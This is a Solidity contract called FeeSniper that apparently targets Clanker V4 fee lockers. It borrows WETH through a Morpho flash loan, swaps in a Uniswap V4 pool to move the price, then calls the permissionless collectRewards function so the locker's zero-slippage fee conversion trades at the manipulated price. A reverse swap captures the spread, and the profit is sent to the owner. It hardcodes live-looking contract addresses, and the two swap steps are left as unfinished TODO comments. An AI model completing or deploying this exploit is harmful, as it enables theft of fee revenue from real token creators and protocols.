// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// Minimal interfaces — no imports needed
interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
}

interface IUnlockCallback {
    function unlockCallback(bytes calldata data) external returns (bytes memory);
}

interface IClankerLocker {
    function collectRewards(address token) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

/// @title FeeSniper — extracts value from Clanker V4 zero-slippage fee conversions
/// @dev Uses Morpho flash loan (0% fee) + Uniswap V4 swaps in a single atomic tx
contract FeeSniper is IUnlockCallback {
    address public immutable owner;

    IMorpho constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IPoolManager constant PM = IPoolManager(0x498581fF718922c3f8e6A244956aF099B2652b2b);
    address constant WETH = 0x4200000000000000000000000000000000000006;

    // Packed params for the callback chain
    bytes private _pendingData;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    /// @notice Execute a fee snipe: flash loan → swap → collectRewards → reverse swap
    function snipe(
        address token,
        address locker,
        uint256 flashAmount,
        bytes calldata swapData  // Pre-encoded V4 swap calldata
    ) external onlyOwner {
        // Store params for callback
        _pendingData = abi.encode(token, locker, flashAmount, swapData);

        // Take flash loan — Morpho calls back onMorphoFlashLoan
        MORPHO.flashLoan(WETH, flashAmount, "");

        // After flash loan repaid, sweep profit
        uint256 profit = IERC20(WETH).balanceOf(address(this));
        if (profit > 0) {
            IERC20(WETH).transfer(owner, profit);
        }

        // Sweep any leftover tokens
        uint256 tokenBal = IERC20(token).balanceOf(address(this));
        if (tokenBal > 0) {
            IERC20(token).transfer(owner, tokenBal);
        }

        delete _pendingData;
    }

    /// @notice Morpho flash loan callback
    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MORPHO), "!morpho");

        (address token, address locker, uint256 flashAmount, bytes memory swapData) =
            abi.decode(_pendingData, (address, address, uint256, bytes));

        // Approve WETH to PoolManager for the swap
        IERC20(WETH).approve(address(PM), type(uint256).max);
        IERC20(token).approve(address(PM), type(uint256).max);

        // Enter V4's unlock context to perform swaps
        PM.unlock(abi.encode(token, locker, flashAmount));

        // Repay Morpho (0% fee — repay exactly what we borrowed)
        IERC20(WETH).transfer(address(MORPHO), assets);
    }

    /// @notice V4 PoolManager unlock callback — this is where swaps happen
    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(PM), "!pm");

        (address token, address locker, uint256 amount) =
            abi.decode(data, (address, address, uint256));

        // Step 1: Swap WETH → token (move price)
        // We use PoolManager.swap directly within the unlock context
        // TODO: encode the actual swap params based on pool

        // Step 2: Trigger fee collection (zero-slippage conversion happens here)
        try IClankerLocker(locker).collectRewards(token) {} catch {}

        // Step 3: Swap token → WETH (capture spread)
        // TODO: reverse swap

        return "";
    }

    /// @notice Simple version: just call collectRewards without flash loan
    /// This doesn't profit us directly but tests the permissionless call
    function triggerCollection(address locker, address token) external {
        IClankerLocker(locker).collectRewards(token);
    }

    /// @notice Rescue stuck tokens
    function rescue(address token) external onlyOwner {
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    receive() external payable {}
}
